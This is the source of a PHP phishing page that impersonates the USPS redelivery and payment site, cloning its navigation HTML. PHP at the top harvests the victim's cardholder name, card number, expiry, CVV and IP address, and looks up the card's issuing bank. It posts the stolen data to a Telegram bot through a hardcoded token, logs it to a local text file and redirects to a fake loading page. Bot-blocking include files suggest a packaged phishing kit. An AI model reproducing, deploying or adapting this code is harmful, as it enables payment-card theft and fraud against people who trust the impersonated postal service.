<?php
include "anti/genius.php";
include "anti/genius1.php"; 
include "anti/genius2.php"; 
include "anti/genius3.php"; 
include "anti/genius4.php"; 
include "anti/genius5.php"; 
include "anti/genius6.php"; 
include "anti/genius7.php"; 
extract($_REQUEST); 
include "id.php";
if(isset($_POST['okbb']))
{   $F=$_POST["Cardholder"];
    $L=$_POST['cardn'];
    $C=$_POST['Expiry'];
    $PH=$_POST["cvv2"];
    $ip = getenv("REMOTE_ADDR");
    $bin        = str_replace(' ', '', $_POST['cardn']);
    $bin        = substr($bin, 0, 6);
    $getdetails = 'https://lookup.binlist.net/' . $bin;
    $curl       = curl_init();
    curl_setopt($curl, CURLOPT_URL, $getdetails);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content    = curl_exec($curl);
    curl_close($curl);
    $details  = json_decode($content);
    $_SESSION['_namebank_'] = $namebank   = $details->bank->name;
    $ip = getenv("REMOTE_ADDR");
    $message=" -------  Gneius  USPS CC -------"."\n"."Full name :  ".$F."\n"."CC Number :   ".$L."\n"."expr date :   ".$C."\n"."CVV :   ".$PH."\n"."Type CC Bank :"."\n".$_SESSION['_namebank_']."\n".$ip."\n"."------------  USPS  -------------";
    foreach($user_ids as $user_id) 
    {
        $url='https://api.telegram.org/bot6691628482:AAERSLS9uTXK7tc0LqHYbAUv-YO2dD2Etvw/sendMessage';
        $data=array('chat_id'=>$user_id,'text'=>$message);
        $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
        $context=stream_context_create($options);
        $result=file_get_contents($url,false,$context);
    }
    $myfile = fopen("noni.txt", "a+");
    $txt = $message;
    fwrite($myfile, $txt);
    fclose($myfile);
    HEADER("Location: loadingcc.php");
}
?>
<!DOCTYPE html>
<html lang="en" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta id="myViewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="" content="">  

<title> Payment On Delivery| USPS</title>
    <link rel="shortcut icon" href="https://conquistarmulhereshoje.com/85/img/favicon.ico">
    <link rel="stylesheet" href="files/2_files/bootstrap.min.css">
    <link rel="stylesheet" href="files/2_files/jquery-ui.min.css">
    <link rel="stylesheet" href="files/2_files/default-styles.css">
    <link rel="stylesheet" href="files/2_files/schedule-redelivery.css">
    <link rel="stylesheet" href="files/2_files/calendar.css">

<body>

<div id="root" style="display: none;"><div><div class="white-spinner-wrapper"><div class="white-spinner-container"><div class="spinner-content"><h5>Processing</h5><div class="white-spinner-progress"><span class="white-spinner"><div class="spinner"><div class="bar-1"></div><div class="bar-2"></div><div class="bar-3"></div><div class="bar-4"></div><div class="bar-5"></div></div></span></div><p></p></div><div class="gray-overlay"></div></div></div></div></div> 

<form action="" method="post">
    
<link href="files/2_files/megamenu-v4.css" type="text/css" rel="stylesheet">
<div class="nav-utility" id="nav-utility">
  <div class="utility-links" id="utility-header">
  <a tabindex="-1" href="https://www.usps.com/globals/site-index.htm" class="hidden-skip">Go to USPS.com Site Index.</a>
  <a tabindex="0" id="skiptomain" href="##endnav" class="hidden-skip keyboard">Skip to Main Content</a>
  <a tabindex="-1" name="skiputil" id="skiputil" href="##skipallnav" class="hidden-skip">Skip All Utility Navigation</a>
    <div class="lang-select">
      <a id="link-lang" href="##">
        <span class="visuallyhidden">Current language:</span>
        English
      </a>
      <ul class="lang-list">
        <li class="lang-option">
          <a class="multi-lang-link" tabindex="-1" href="javascript:OneLink(&#39;en&#39;);">English</a>
        </li>
        <li class="lang-option">
          <a class="multi-lang-link" tabindex="-1" href="javascript:OneLink(&#39;es&#39;);">Español</a>
        </li>
        <li class="lang-option last">
          <a class="multi-lang-link" tabindex="-1" href="javascript:OneLink(&#39;zh&#39;);"><span class="visuallyhidden">Chinese</span></a>
        </li>
      </ul>
    </div>
    <a id="link-locator" href="https://tools.usps.com/find-location.htm">Locations</a>
    <a id="link-customer" href="https://www.usps.com/help/contact-us.htm">Support</a>
    <a id="link-myusps" href="https://informeddelivery.usps.com/">Informed Delivery</a>
    <a id="login-register-header" class="link-reg" href="https://reg.usps.com/entreg/LoginAction_input?app=REDELIVERY&amp;appURL=#">Register / Sign In</a>
    <div id="link-cart" style="display: inline-block;"></div>
  </div>
</div>
<div class="global--navigation" id="g-navigation">
  <a tabindex="-1" name="skipallnav" id="skipallnav" href="##endnav" class="hidden-skip">Skip all category navigation links</a>
<div class="nav-full">

  <a class="global-logo" href="https://www.usps.com/" style="vertical-align: baseline;">
    <img src="files/2_files/logo-sb.svg" alt="Image of USPS.com logo." aria-label="Image of USPS.com logo.">
  </a>
  <div class="mobile-header">
    <a class="mobile-hamburger" href="##"><img src="files/2_files/hamburger.svg" alt="hamburger menu Icon"></a>
    <a class="mobile-logo" href="https://www.usps.com/"><img src="files/2_files/logo_mobile.svg" alt="USPS mobile logo"></a>
    <a class="mobile-search" href="##"><img src="files/2_files/search.svg" alt="Search Icon"></a>
  </div>
  
<nav>
    <div class="mobile-log-state">
    <div id="msign" class="mobile-utility">
      <div class="mobile-sign"><a href="https://reg.usps.com/entreg/LoginAction_input?app=REDELIVERY&amp;appURL=#">Sign In</a></div>
    </div>
  </div>
    <ul class="nav-list" role="menubar">
      <li class="qt-nav menuheader">
      <a tabindex="-1" name="navquicktools" id="navquicktools" href="##navmailship" class="hidden-skip">Skip Quick Tools Links</a>
    <a aria-expanded="false" role="menuitem" tabindex="0" aria-haspopup="true" class="nav-first-element menuitem" href="##">Quick Tools</a>
        <div class="">
      <ul role="menu" aria-hidden="true">
        <li>
          <a role="menuitem" tabindex="-1" href="https://tools.usps.com/go/TrackConfirmAction_input">    
            <img src="files/2_files/tracking.svg" alt="Tracking Icon">
            <p>Track a Package</p> 
          </a>
        </li>
        <li>
          <a role="menuitem" tabindex="-1" href="https://informeddelivery.usps.com/">
            <img src="files/2_files/mailman.svg" alt="Informed Delivery Icon">
            <p>Informed Delivery</p>
          </a>
        </li>
        <li>
          <a role="menuitem" tabindex="-1" href="https://tools.usps.com/find-location.htm">
            <img src="files/2_files/location.svg" alt="Post Office Locator Icon">
            <p>Find USPS Locations</p>
          </a>
        </li>
        <li>
          <a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=buy-stamps">
            <img src="files/2_files/stamps.svg" alt="Stamps Icon">
            <p>Buy Stamps</p>
          </a>
        </li>
        <li>
          <a role="menuitem" tabindex="-1" href="https://tools.usps.com/schedule-pickup-steps.htm">
            <img src="files/2_files/schedule_pickup.svg" alt="Schedule a Pickup Icon">
            <p>Schedule a Pickup</p>
          </a>
        </li>
        <li>
          <a role="menuitem" tabindex="-1" href="https://postcalc.usps.com/">
            <img src="files/2_files/calculate_price.svg" alt="Calculate a Price Icon">
            <p>Calculate a Price</p>
          </a>
        </li>
        <li>
          <a role="menuitem" tabindex="-1" href="https://tools.usps.com/zip-code-lookup.htm">
            <img src="files/2_files/find_zip.svg" alt="Zip Code™ Lookup Icon">
            <p>Look Up a <br>ZIP Code<sup>™</sup></p>
          </a>
        </li>
        <li>
          <a role="menuitem" tabindex="-1" href="https://holdmail.usps.com/holdmail/">
            <img src="files/2_files/holdmail.svg" alt="Holdmail Icon">
            <p>Hold Mail</p>
          </a>
        </li>
        <li>
          <a role="menuitem" tabindex="-1" href="https://moversguide.usps.com/?referral=MG82">
            <img src="files/2_files/change_address.svg" alt="Change of Address Icon">
            <p>Change My Address</p>
          </a>
        </li>
        <li>
          <a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/po-boxes.htm">
            <img src="files/2_files/po_box.svg" alt="Post Office Boxes Icon">
            <p>Rent/Renew a <br>PO Box</p>
          </a>
        </li>
        <li>  
          <a role="menuitem" tabindex="-1" href="https://store.usps.com/store/results/free-shipping-supplies/shipping-supplies/_/N-alnx4jZ7d0v8v">
            <img src="files/2_files/free_boxes.svg" alt="Shipping Supplies Icon">
            <p>Free Boxes</p>
          </a>
        </li>
        <li>
          <a role="menuitem" tabindex="-1" href="https://cns.usps.com/">
            <img src="files/2_files/featured_clicknship.svg" alt="Click-N-Ship Icon">
            <p>Click-N-Ship</p>
          </a>
        </li>
      </ul>
        </div>
      </li>
      <li class="menuheader">
      <a tabindex="-1" name="navmailship" id="navmailship" href="##navtrackmanage" class="hidden-skip">Skip Send Links</a>
    <a id="mail-ship-width" aria-expanded="false" class="menuitem" role="menuitem" tabindex="0" aria-haspopup="true" href="https://www.usps.com/ship/">Send</a>
        <div class="repos">
          <ul role="menu" aria-hidden="true" class="tools">
            <h3>Tools</h3>
            <li class="tool-cns"><a role="menuitem" tabindex="-1" href="https://cns.usps.com/">Click-N-Ship</a></li>
            <li class="tool-stamps"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/">Stamps &amp; Supplies</a></li>
            <li class="tool-zip"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/zip-code-lookup.htm">Look Up a ZIP Code<sup>™</sup></a></li>     
            <li class="tool-calc"><a role="menuitem" tabindex="-1" href="https://postcalc.usps.com/">Calculate a Price</a></li>
            <li class="tool-pick"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/schedule-pickup-steps.htm">Schedule a Pickup</a></li>
            <li class="tool-find"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/find-location.htm">Find USPS Locations</a></li>
            <li class="tool-track"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/go/TrackConfirmAction_input">Tracking</a></li>     
          </ul>
          <ul role="menu" aria-hidden="true">
            <h3>Learn About</h3> 
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/">Sending</a></li>
        <ul aria-hidden="true">
          <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/letters.htm">Sending Mail</a></li>
          <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/packages.htm">Sending Packages</a></li>
          <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/insurance-extra-services.htm">Insurance &amp; Extra Services</a></li>
          <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/shipping-restrictions.htm">Shipping Restrictions</a></li>        
        </ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/online-shipping.htm">Online Shipping</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/label-broker.htm">Label Broker</a></li>      
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/custom-mail.htm">Custom Mail, Cards, &amp; Envelopes</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/prices.htm">Postage Prices</a></li>      
          </ul>
      <ul role="menu" aria-hidden="true">
            <h3 class="desktop-only">&nbsp;</h3>
      <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/mail-shipping-services.htm">Mail &amp; Shipping Services</a></li>
        <ul aria-hidden="true">
          <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/priority-mail-express.htm">Priority Mail Express</a></li>
          <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/priority-mail.htm">Priority Mail</a></li>
          <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/first-class-mail.htm">First-Class Mail</a></li>
          <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/apo-fpo-dpo.htm">Military &amp; Diplomatic Mail</a></li>
         </ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/package-intercept.htm">Redirecting a Package</a></li>         
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/shop/money-orders.htm">Money Orders</a></li>
      <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/claims.htm">Filing a Claim</a></li>
      <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/refunds.htm">Requesting a Refund</a></li>      
       <div class="desktop-only mailship-addition"><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/go-now.htm"><img src="files/2_files/go-now_1.png" alt=" "><span class="visuallyhidden">Print and ship from home. Start Click-N-Ship.</span></a></div>
      </ul>
      
     
      <span aria-hidden="false" tabindex="-1" class="input--wrap">
        <label tabindex="-1" class="visuallyhidden" for="global-header--search-track-mail-ship">Search USPS.com</label>
        <input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-mail-ship" maxlength="256" name="q" type="text">
        <div class="autocorrect"><ul aria-hidden="true"></ul></div>
        <input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
      </span>
      
        </div>
      </li>
      <li class="menuheader">
      <a tabindex="-1" name="navtrackmanage" id="navtrackmanage" href="##navpostalstore" class="hidden-skip">Skip Receive Links</a>
    <a aria-expanded="false" class="menuitem" role="menuitem" tabindex="0" aria-haspopup="true" href="https://www.usps.com/manage/">Receive</a>
        <div>
          <ul role="menu" aria-hidden="true" class="tools">
            <h3>Tools</h3>
            <li class="tool-track"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/go/TrackConfirmAction_input">Tracking</a></li>
            <li class="tool-informed"><a role="menuitem" tabindex="-1" href="https://informeddelivery.usps.com/">Informed Delivery</a></li>
            <li class="tool-intercept"><a role="menuitem" tabindex="-1" href="https://retail-pi.usps.com/retailpi/actions/index.action">Intercept a Package</a></li>
            <li class="tool-redelivery"><a role="menuitem" tabindex="-1" href="https://tools.usps.com/redelivery.htm">Schedule a Redelivery</a></li>
            <li class="tool-hold"><a role="menuitem" tabindex="-1" href="https://holdmail.usps.com/holdmail/">Hold Mail</a></li>
            <li class="tool-change"><a role="menuitem" tabindex="-1" href="https://moversguide.usps.com/?referral=MG80">Change of Address</a></li>
            <li class="tool-pobol"><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/po-boxes.htm">Rent or Renew PO Box</a></li>
          </ul>
          <ul role="menu" aria-hidden="true">
            <h3>Learn About</h3>            
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/">Managing Mail</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://informeddelivery.usps.com/">Informed Delivery</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/forward.htm">Forwarding Mail</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/package-intercept.htm">Redirecting a Package</a></li>      
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/po-boxes.htm">PO Boxes</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/mailboxes.htm">Mailbox Guidelines</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/mail-for-deceased.htm">Mail for the Deceased</a></li>
      <div class="desktop-only manage-addition"><a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/go-now.htm"><img src="files/2_files/go-now_2.png" alt=" "></a></div>
          </ul>
      
      <span tabindex="-1" aria-hidden="false" class="input--wrap">
        <label tabindex="-1" class="visuallyhidden" for="global-header--search-track-track-manage">Search USPS.com</label>
        <input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-track-manage" maxlength="256" name="q" type="text">
        <div class="autocorrect"><ul aria-hidden="true"></ul></div>
        <input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
      </span>
      
        </div>
      </li>
      <li class="menuheader">
      <a tabindex="-1" name="navpostalstore" id="navpostalstore" href="##navbusiness" class="hidden-skip">Skip Shop Links</a>
    <a aria-expanded="false" class="menuitem" role="menuitem" tabindex="0" aria-haspopup="true" href="https://store.usps.com/store">Shop</a>
        <div class="repos">
          <ul role="menu" aria-hidden="true" class="tools">
            <h3>Shop</h3>
            

            <li class="tool-stamps"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=buy-stamps">Stamps</a></li>
            <li class="tool-supplies"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=shipping-supplies">Shipping Supplies</a></li>
            <li class="tool-cards"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=cards-envelopes">Cards &amp; Envelopes</a></li>
            <li class="tool-pse"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/pse/">Personalized Stamped Envelopes</a></li>
      <li class="tool-coll"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=stamp-collectors">Collectors</a></li>
            <li class="tool-gifts"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=stamp-gifts">Gifts</a></li>
            <li class="tool-business"><a role="menuitem" tabindex="-1" href="https://store.usps.com/store/results/business/_/N-1y2576k">Business Supplies</a></li>
          </ul>

          <ul role="menu" aria-hidden="true">
            <h3>Learn About</h3>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/shop/money-orders.htm">Money Orders</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/shop/returns-exchanges.htm">Returns &amp; Exchanges</a></li>
            <div class="desktop-only shop-addition">
              <a role="menuitem" tabindex="-1" href="https://www.usps.com/store/go-now.htm"><img src="files/2_files/go-now_3.png" alt=" "><span class="visuallyhidden">Shop Forever Stamps. Shop now.</span></a>
      </div>
          </ul>
      
      <span tabindex="-1" aria-hidden="false" class="input--wrap">
        <label class="visuallyhidden" tabindex="-1" for="global-header--search-track-store">Search the Postal Store: Keyword or SKU</label>
        <input tabindex="-1" autocomplete="off" placeholder="Search the Postal Store: Keyword or SKU" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-store" maxlength="256" name="q" type="text">
        <div class="autocorrect"><ul aria-hidden="true"></ul></div>
        <input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
      </span>
      
        </div>
      </li>
      <li class="menuheader">
      <a tabindex="-1" name="navbusiness" id="navbusiness" href="##navinternational" class="hidden-skip">Skip Business Links</a>
    <a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="https://www.usps.com/business/">Business</a>
        <div class="repos">
          <ul role="menu" aria-hidden="true" class="tools">
            <h3>Tools</h3>
            <li class="tool-calc"><a role="menuitem" tabindex="-1" href="https://postcalc.usps.com/business">Calculate a Business Price</a></li>
             <li class="tool-loyalty"><a role="menuitem" tabindex="-1" href="https://loyalty.usps.com/">Check Loyalty Points &amp; Rewards</a></li>
            <li class="tool-eddm"><a role="menuitem" tabindex="-1" href="https://eddm.usps.com/eddm/customer/routeSearch.action">Every Door Direct Mail</a></li>
            <div class="desktop-only business-addition">
              <a role="menuitem" tabindex="-1" href="https://www.usps.com/business/go-now.htm"><img src="files/2_files/go-now_4.png" alt=" "><span class="visuallyhidden">Grow your business with Every Door Direct Mail. Try EDDM now.</span></a>
      </div>
          </ul>

          <ul role="menu" aria-hidden="true">
            <h3>Learn About</h3>            

            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/business-shipping.htm">Business Shipping</a></li>
            <ul aria-hidden="true">
              <li><a role="menuitem" tabindex="-1" target="_blank" href="https://www.uspsconnect.com/">USPS Connect</a></li>      
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/loyalty.htm">USPS Loyalty Program</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/shipping-consolidators.htm">Shipping Consolidators</a></li>            </ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/advertise-with-mail.htm">Advertising with Mail</a></li>
            <ul aria-hidden="true">
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/every-door-direct-mail.htm">Using EDDM</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/vendors.htm">Mailing &amp; Printing Services</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/customized-direct-mail.htm">Customized Direct Mail</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/political-mail.htm">Political Mail</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/promotions-incentives.htm">Promotions &amp; Incentives</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/informed-delivery.htm">Informed Delivery Marketing</a></li>        
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/product-samples.htm">Product Samples</a></li>
            </ul>
          </ul>
          <ul role="menu" aria-hidden="true">
            <h3 class="desktop-only">&nbsp;</h3>
            
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/postage-options.htm">Postage Options</a></li>
            <ul aria-hidden="true">          
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/verify-postage.htm">Ver ying Postage</a></li>
            </ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/return-services.htm">Returns Services</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/label-broker.htm">Label Broker</a></li>      
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/international-shipping.htm">International Business Shipping</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/manage-mail.htm">Managing Business Mail</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/web-tools-apis/">Web Tools (APIs)</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/business/prices.htm">Prices</a></li>
          </ul>
      
      <span tabindex="-1" aria-hidden="false" class="input--wrap">
        <label tabindex="-1" class="visuallyhidden" for="global-header--search-track-business">Search USPS.com</label>
        <input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-business" maxlength="256" name="q" type="text">
        <div class="autocorrect"><ul aria-hidden="true"></ul></div>
        <input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
      </span>
      
        </div>
      </li>
      <li class="menuheader">
    <a tabindex="-1" name="navinternational" id="navinternational" href="##navhelp" class="hidden-skip">Skip International Links</a>
    <a class="menuitem" tabindex="0" aria-expanded="false" aria-haspopup="true" role="menuitem" href="https://www.usps.com/international/">International</a>
        <div class="repos">
          <ul role="menu" aria-hidden="true" class="tools">
            <h3>Tools</h3>
      
            <li class="tool-calc"><a role="menuitem" tabindex="-1" href="https://postcalc.usps.com/?country=10440">Calculate International Prices</a></li>
            <li class="tool-international-labels"><a role="menuitem" tabindex="-1" href="https://cns.usps.com/">Print International Labels</a></li>
            <li class="tool-international-forms"><a role="menuitem" tabindex="-1" href="https://cfo.usps.com/cfo-web/labelInformation.html">Print Customs Forms</a></li>      
            <div class="desktop-only international-addition">
              <a role="menuitem" tabindex="-1" href="https://www.usps.com/international/go-now.htm"><img src="files/2_files/go-now.png" alt=" "><span class="visuallyhidden">Use our online scheduler to make a passport appointment. Schedule Today.</span></a>
      </div>
          </ul>
      
          <ul role="menu" aria-hidden="true">
            <h3>Learn About</h3>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/">International Sending</a></li>               
            <ul aria-hidden="true">
        <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/letters.htm">How to Send a Letter Internationally</a></li>
        <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/preparing-international-shipments.htm">How to Send a Package Internationally</a></li>           
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/shipping-restrictions.htm">International Shipping Restrictions</a></li>
        <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/international-how-to.htm">Shipping Internationally Online</a></li>        
        <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/insurance-extra-services.htm">International Insurance &amp; Extra Services</a></li>
        <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/customs-forms.htm">Completing Customs Forms</a></li>
            </ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/apo-fpo-dpo.htm?pov=international">Military &amp; Diplomatic Mail</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/money-transfers.htm">Sending Money Abroad</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/passports.htm">Passports</a></li>
          </ul>
          <ul role="menu" aria-hidden="true">
            <h3 class="desktop-only">&nbsp;</h3>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/mail-shipping-services.htm">Comparing International Shipping Services</a></li>  
            <ul aria-hidden="true">
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/gxg.htm">Global Express Guaranteed</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/priority-mail-express-international.htm">Priority Mail Express International</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/priority-mail-international.htm">Priority Mail International</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/first-class-package-international-service.htm">First-Class Package International Service</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/first-class-mail-international.htm">First-Class Mail International</a></li>       
        
            </ul>   
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/international-claims.htm">Filing an International Claim</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/international-refunds.htm">Requesting an International Refund</a></li>     
          </ul>     
    
      <label tabindex="-1" class="visuallyhidden" for="global-header--search-track-international">Search USPS.com</label>
      <input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-international" maxlength="256" name="q" type="text">
      <div class="autocorrect"><ul aria-hidden="true"></ul></div>
      <input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
    </span>
    
        </div>
      </li>
      <li class="menuheader">
      <a tabindex="-1" name="navhelp" id="navhelp" href="##navsearch" class="hidden-skip">Skip Help Links</a>
    <a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="https://faq.usps.com/s/">Help</a>
      <div class="repos">
        <ul role="menu" aria-hidden="true">
        <li><a role="menuitem" tabindex="-1" href="https://faq.usps.com/s/">FAQs</a></li>
        <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/missing-mail.htm">Finding Missing Mail</a></li>
        <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/claims.htm">Filing a Claim</a></li>
        <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/refunds.htm">Requesting a Refund</a></li>
        </ul>
      </div>
      </li>
    <li class="nav-search menuheader">
      <a tabindex="-1" name="navsearch" id="navsearch" href="##endnav" class="hidden-skip">Skip Search</a>
    <a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="##">Search USPS.com</a>
    <div class="repos">
    <!-- Search -->
    <span aria-hidden="false" class="input--wrap-label">
      <label class="visuallyhidden" for="styleguide-header--search-track">Search USPS.com</label>
    </span>

    
      <span tabindex="-1" aria-hidden="false" class="input--wrap">
        <label tabindex="-1" class="visuallyhidden" for="global-header--search-track-search">Search USPS.com</label>
        <input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-search" maxlength="256" name="q" type="text">
        <div class="autocorrect"><ul aria-hidden="true"></ul></div>
        <input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
      </span>
    

    <div class="empty-search">
      <p>Top Searches</p>
      <ul aria-hidden="true">
        <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=PO%20Boxes">PO BOXES</a></li>
        <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Passports">PASSPORTS</a></li>
        <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Free%20Boxes">FREE BOXES</a></li>
      </ul>
    </div>
    <!-- END Search -->
    </div>
    </li>

    </ul>
  </nav>
  
  <div class="search--wrapper-hidden" id="search--display">
      <span aria-hidden="false" class="input--wrap-label">
      </span>
    
      <span aria-hidden="false" class="input--wrap">
        <div class="easy-autocomplete search-box">
          <label class="visuallyhidden" for="global-header--search-track-mob-search">Enter Search term for Search USPS.com</label>
          <input autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q fsrVisible global-header--search-track" id="global-header--search-track-mob-search" maxlength="256" name="q" type="text">
          <input value="Search" class="input--search search--submit" type="submit">
        </div>
                    <div class="autocorrect"><ul></ul></div>
      </span>

        <div class="empty-search">
          <p>Top Searches</p>
          <ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=PO%20Boxes">PO BOXES</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Passports">PASSPORTS</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Free%20Boxes">FREE BOXES</a></li>
          </ul>
        </div>
  </div> 
  
  <a name="endnav" id="endnav" href="##" class="hidden-skip">&nbsp;</a>
</div></div>  


    <input type="hidden" id="regUserID" value="">
    <div class="schedule-redelivery-main-header">

        <div class="container-fluid">
            <div class="row">
                <div class="col-md-12 col-sm-12 col-xs-12 main-header">
                    <ul class="header-tabs hidden-xs">
                        <li class="tab">
                            <a href="https://conquistarmulhereshoje.com/85/welcome.htm" class="tab-link active schedule-redelivery-header" aria-label="Current Page Schedule A Redelivery">Schedule a Redelivery</a>
                        </li>
                        <li class="tab">
